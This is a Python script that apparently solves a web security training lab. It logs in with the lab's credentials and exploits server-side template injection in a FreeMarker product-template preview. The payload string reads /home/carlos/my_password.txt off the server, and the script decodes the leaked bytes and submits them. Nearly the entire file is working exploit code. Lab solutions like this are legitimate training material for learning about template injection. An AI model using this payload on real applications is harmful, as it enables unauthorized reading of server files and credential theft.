import requests
import re
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.csrf = None
        self.answer = None

    def getting_csrf(self):
        response = self.session.get(self.lab_url + 'login')
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def signing_in(self):
        data = {
            'csrf': self.csrf,
            'username': 'content-manager',
            'password': 'C0nt3ntM4n4g3r'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def injecting_the_payload_and_deleting_the_user(self):
        data = {
            'csrf': self.csrf,
            'template': '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/home/carlos/my_password.txt\').toURL().openStream().readAllBytes()?join(" ")}',
            'template-action': 'preview'
        }
        response = self.session.post(self.lab_url + 'product/template?productId=1', data=data)
        string = re.search(r'<div id=preview-result>\n(.*)', response.text).groups(1)[0].strip().split(' ')
        self.answer = ''.join(chr(int(code)) for code in string)
        print(self.answer)

    def submit_solution(self):
        data = {
            'answer': self.answer
        }
        self.session.post(self.lab_url + 'submitSolution', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.getting_csrf()
        self.signing_in()
        self.injecting_the_payload_and_deleting_the_user()
        self.submit_solution()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
